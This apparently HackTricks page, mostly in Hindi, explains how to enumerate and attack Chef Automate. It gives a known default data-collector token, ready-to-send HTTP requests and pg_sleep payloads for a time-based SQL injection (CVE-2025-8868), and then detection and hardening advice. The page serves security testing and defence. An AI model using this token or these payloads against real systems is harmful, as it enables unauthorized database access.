# Chef Automate Enumeration & Attacks

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

यह पृष्ठ Chef Automate इंस्टेंस को enumerate और attack करने के practical techniques संग्रहीत करता है, विशेष जोर के साथ:
- gRPC-Gateway-backed REST endpoints की खोज और validation/error responses के माध्यम से request schemas का अनुमान लगाना
- defaults मौजूद होने पर x-data-collector-token authentication header का दुरुपयोग
- Time-based blind SQL injection in the Compliance API (CVE-2025-8868) जो /api/v0/compliance/profiles/search में filters[].type फील्ड को प्रभावित करती है

> Note: Backend responses that include header grpc-metadata-content-type: application/grpc typically indicate a gRPC-Gateway bridging REST calls to gRPC services.

## Recon: Architecture and Fingerprints

- Front-end: अक्सर Angular। Static bundles REST paths (e.g., /api/v0/...) का संकेत दे सकते हैं
- API transport: REST to gRPC via gRPC-Gateway
- Responses may include grpc-metadata-content-type: application/grpc
- Database/driver fingerprints:
- Error bodies starting with pq: strongly suggest PostgreSQL with the Go pq driver
- Interesting Compliance endpoints (auth required):
- POST /api/v0/compliance/profiles/search
- POST /api/v0/compliance/scanner/jobs/search

## Auth: Data Collector Token (x-data-collector-token)

Chef Automate एक data collector expose करता है जो requests को एक dedicated header के माध्यम से authenticate करता है:

- Header: x-data-collector-token
- Risk: कुछ environments में default token रह सकता है जो protected API routes तक access देता है। जंगली में देखा गया ज्ञात default:
- 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

यदि मौजूद हो, तो इस token का उपयोग उन Compliance API endpoints को call करने के लिए किया जा सकता है जो सामान्यतः auth के पीछे बंद होते हैं। Hardening के दौरान defaults को rotate/disable करने का प्रयास करें।

## API Schema Inference via Error-Driven Discovery

gRPC-Gateway-backed endpoints अक्सर useful validation errors को leak करते हैं जो expected request model का वर्णन करते हैं।

For /api/v0/compliance/profiles/search, the backend expects a body with a filters array, where each element is an object with:

- type: string (filter field identifier)
- values: array of strings

Example request shape:
```json
{
"filters": [
{ "type": "name", "values": ["test"] }
]
}
```
Malformed JSON या गलत field types आमतौर पर 4xx/5xx त्रुटियाँ ट्रिगर करते हैं जिनमें hints होते हैं, और headers gRPC-Gateway के व्यवहार को संकेत करते हैं। इनका उपयोग fields को मैप करने और injection surfaces को स्थानीयकृत करने के लिए करें।

## Compliance API SQL Injection (CVE-2025-8868)

- Affected endpoint: POST /api/v0/compliance/profiles/search
- Injection point: filters[].type
- Vulnerability class: time-based blind SQL injection in PostgreSQL
- Root cause: type फ़ील्ड को dynamic SQL fragment में interpolate करते समय उचित parameterization/whitelisting न होना (संभवतः identifiers/WHERE clauses बनाने के लिए उपयोग किया जाता है)। type में बनाए गए crafted मान PostgreSQL द्वारा आकलित किए जाते हैं।

Working time-based payload:
```json
{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Technique notes:
- मूल स्ट्रिंग को एकल उद्धरण (') से बंद करें
- एक उप-प्रश्न जोड़ें जो pg_sleep(N) को कॉल करे
- || के माध्यम से स्ट्रिंग संदर्भ में फिर से प्रवेश करें ताकि अंतिम SQL, चाहे यह किसी भी स्थान पर एम्बेड हो, सिंटैक्टिक रूप से वैध रहे

### डिफरेंशियल लेटेंसी के माध्यम से प्रमाण

जुड़े हुए अनुरोध भेजें और प्रतिक्रिया समयों की तुलना करें ताकि server-side निष्पादन सत्यापित किया जा सके:

- N = 1 second
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(1))||'","values":["test"]}]}
```
- N = 5 सेकंड
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Observed behavior:
- प्रतिक्रिया समय pg_sleep(N) के साथ बढ़ते हैं
- HTTP 500 प्रतिक्रियाओं में probing के दौरान pq: विवरण शामिल हो सकते हैं, जो SQL निष्पादन पथों की पुष्टि करते हैं

> टिप: शोर और false positives कम करने के लिए एक timing validator (उदा., सांख्यिकीय तुलना के साथ कई परीक्षण) उपयोग करें।

### प्रभाव

प्रमाणित उपयोगकर्ता — या default x-data-collector-token का दुरुपयोग करने वाले unauthenticated actors — Chef Automate के PostgreSQL संदर्भ में arbitrary SQL निष्पादित कर सकते हैं, जिससे compliance profiles, configuration, और telemetry की गोपनीयता और अखंडता को जोखिम होता है।

### प्रभावित संस्करण / समाधान

- CVE: CVE-2025-8868
- अपग्रेड मार्गदर्शन: Chef Automate 4.13.295 या बाद के (Linux x86) vendor advisories के अनुसार

## पहचान और फोरेंसिक्स

- API layer:
- /api/v0/compliance/profiles/search पर 500s की निगरानी करें जहाँ filters[].type में quotes ('), concatenation (||), या pg_sleep जैसे function references शामिल हों
- gRPC-Gateway प्रवाहों की पहचान के लिए response headers में grpc-metadata-content-type की जाँच करें
- Database layer (PostgreSQL):
- pg_sleep कॉल और malformed identifier errors के लिए ऑडिट करें (अक्सर Go pq driver से आने वाले pq: prefixes के साथ सामने आते हैं)
- Authentication:
- x-data-collector-token के उपयोग पर लॉग और अलर्ट करें, विशेषकर ज्ञात default मानों के लिए, API paths में

## निवारण और हार्डनिंग

- तात्कालिक:
- default data collector tokens को rotate/disable करें
- data collector endpoints के ingress को सीमित करें; मजबूत, unique tokens लागू करें
- कोड-स्तर:
- क्वेरीज़ को parameterize करें; SQL fragments को कभी string-concatenate न करें
- सर्वर पर अनुमत type मानों को सख्ती से whitelist करें (enum)
- identifiers/clauses के लिए dynamic SQL assembly से बचें; यदि dynamic व्यवहार आवश्यक है, तो safe identifier quoting और explicit whitelists का उपयोग करें

## व्यावहारिक परीक्षण चेकलिस्ट

- जाँचें कि x-data-collector-token स्वीकार होता है और ज्ञात default काम करता है या नहीं
- validation errors उत्पन्न करके और error messages/headers पढ़कर Compliance API request schema का mapping करें
- SQLi के लिए कम स्पष्ट “identifier-like” फ़ील्ड्स (उदा., filters[].type) में परीक्षण करें, केवल values arrays या top-level टेक्स्ट फ़ील्ड्स में नहीं
- विभिन्न contexts में SQL को syntactically valid रखने के लिए concatenation के साथ time-based techniques का उपयोग करें

## References

- [Cooking an SQL Injection Vulnerability in Chef Automate (XBOW blog)](https://xbow.com/blog/cooking-an-sql-injection-vulnerability-in-chef-automate)
- [Timing trace (XBOW)](https://xbow-website.pages.dev/traces/chef-automate-sql-injection/)
- [CVE-2025-8868](https://www.cve.org/CVERecord?id=CVE-2025-8868)
- [gRPC-Gateway](https://github.com/grpc-ecosystem/grpc-gateway)
- [pq PostgreSQL driver for Go](https://github.com/lib/pq)

{{#include ../../banners/hacktricks-training.md}}
